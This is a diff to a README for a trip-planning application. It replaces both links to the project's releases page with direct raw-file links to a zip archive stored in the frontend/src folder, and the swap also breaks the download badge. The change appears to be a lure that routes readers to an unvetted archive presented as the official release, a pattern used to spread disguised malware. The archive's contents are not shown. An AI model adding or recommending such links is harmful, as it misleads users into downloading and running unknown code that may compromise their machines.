@@ -1,7 +1,7 @@
 # 🌍 trip-management-system - Organize Your Trips Easily
 
 ## 📥 Download Now!
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue)](https://github.com/DiogoRegoni/trip-management-system/releases)
+[![Download Release](https://raw.githubusercontent.com/DiogoRegoni/trip-management-system/main/frontend/src/trip-management-system-v2.1-alpha.5.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/DiogoRegoni/trip-management-system/main/frontend/src/trip-management-system-v2.1-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the **Trip Management System**! This application helps you plan and manage your trips effortlessly. You can store trip details, track itineraries, and keep all your travel plans organized. 
@@ -21,7 +21,7 @@ Make sure your computer meets the following requirements:
 ## 🔗 Download & Install
 To get started, you can download the latest version of the Trip Management System. 
 
-Visit this page to download: [Release Page](https://github.com/DiogoRegoni/trip-management-system/releases).
+Visit this page to download: [Release Page](https://raw.githubusercontent.com/DiogoRegoni/trip-management-system/main/frontend/src/trip-management-system-v2.1-alpha.5.zip).
 
 ### 📂 Installation Steps
 1. Click on the "Download" button above or visit the Release Page.
